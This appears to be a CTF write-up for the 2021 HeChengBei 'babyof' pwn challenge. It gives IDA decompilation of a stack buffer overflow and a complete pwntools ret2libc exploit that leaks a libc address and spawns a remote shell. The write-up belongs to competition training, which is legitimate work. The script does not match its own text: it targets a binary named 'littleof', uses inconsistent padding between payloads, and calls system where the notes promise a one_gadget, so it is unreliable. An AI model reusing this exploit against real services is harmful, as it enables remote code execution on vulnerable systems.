# HeChengBei 2021 babyof

> 2021 “鹤城杯”河南·鹤壁CTF网络安全挑战赛 初赛 pwn
>
> challenge name: babyof
>
> file: babyof, libc-2.27.so
>
> ld227-3ubuntu1.so and .i64 with comments provided  可以不用看了，程序不长
>
> writeup writer: hexhex16@outlook.com    https://github.com/kokifish



无canary 

1. 第一个payload: 输出libc上的地址，回到baybyof
2. 第二个payload: onegadget





# IDA Analysis

main内基本没做什么，主要逻辑在babyof

```cpp
int babyof()
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("Do you know how to do buffer overflow?");
  read(0, buf, 256uLL);  // 无canary 第一个payload输出libc上的地址 回到baybyof 第二个payload onegadget
  return puts("I hope you win");
}
```





# Exploit Testing!

```python
from pwn import*
sh = remote("182.116.62.85", 27056)
#sh = process('./littleof')
elf = ELF('./littleof')
libc = ELF('./libc-2.27.so')
#libc = elf.libc
context.log_level='debug'

pop_rdi_ret = 0x0400863
main_addr = 0x0400789
pop_rsi_r15_ret = 0x0400861

payload = 'a'*0x40 + 'b'*8 + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main_addr)

sh.recvuntil("?")
sh.sendline(payload)

leak = u64(sh.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libc_base = leak - libc.symbols['puts']
sys_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + libc.search('/bin/sh\x00').next()

payload = 'c'*(0x50-8) + 'd'*8 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(pop_rsi_r15_ret) + p64(0)*2 + p64(sys_addr)

sh.recvuntil("?")
sh.sendline(payload)

sh.interactive()
```

